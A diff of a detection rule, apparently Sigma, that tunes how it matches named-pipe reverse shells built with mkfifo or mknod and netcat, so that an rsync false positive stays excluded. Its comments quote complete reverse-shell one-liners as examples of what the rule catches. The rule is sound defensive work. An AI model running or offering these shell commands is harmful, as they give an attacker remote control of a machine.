@@ -56,12 +56,13 @@ detection:
     # Named-pipe (backpipe) reverse shell built with mkfifo OR mknod:
     #   mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc host port > /tmp/f
     #   mknod  /tmp/bp p; /bin/sh 0</tmp/bp | nc host port 1>/tmp/bp
-    # nc is anchored to a PIPE ('|nc ' / '| nc ') — the reverse shell always pipes
-    # into netcat, whereas the rc.3-verify FP (`bash -c "mkfifo …; … rsync …"`)
-    # only matched because 'nc ' is a substring of 'rsync ': rsync is not piped to
-    # nc, so the pipe anchor excludes it. The shell token stays a bare 'sh' so
-    # /bin/sh, /bin/bash AND /bin/zsh backpipes all match (rc.4-verify coverage
-    # fix — '/bin/sh' had dropped bash/zsh). mkfifo/mknod × |nc / '| nc'.
+    # nc is anchored as a real command token — '|nc ' (piped, no space) OR ' nc '
+    # (space-bounded, which also covers '| nc ' and the nc-LEADING form
+    # 'mkfifo …; nc host < /tmp/f | /bin/sh > /tmp/f'). Both EXCLUDE the rc.3-verify
+    # FP `… rsync …`: 'nc ' is a substring of 'rsync ' but neither '|nc ' nor ' nc '
+    # (there is no space before the 'nc' inside 'rsync') appears. The shell token
+    # stays a bare 'sh' so /bin/sh, /bin/bash AND /bin/zsh backpipes all match
+    # (rc.4-verify coverage fix). {mkfifo,mknod} × {'|nc ',' nc '}.
     selection_mkfifo_nc:
         CommandLine|contains|all:
             - 'mkfifo'
@@ -70,7 +71,7 @@ detection:
     selection_mkfifo_nc_sp:
         CommandLine|contains|all:
             - 'mkfifo'
-            - '| nc '
+            - ' nc '
             - 'sh'
     selection_mknod_nc:
         CommandLine|contains|all:
@@ -80,7 +81,7 @@ detection:
     selection_mknod_nc_sp:
         CommandLine|contains|all:
             - 'mknod'
-            - '| nc '
+            - ' nc '
             - 'sh'
     # Python socket reverse shell, import-order independent. Requires the
     # co-occurring socket + subprocess + connect tokens PLUS a SHELL target
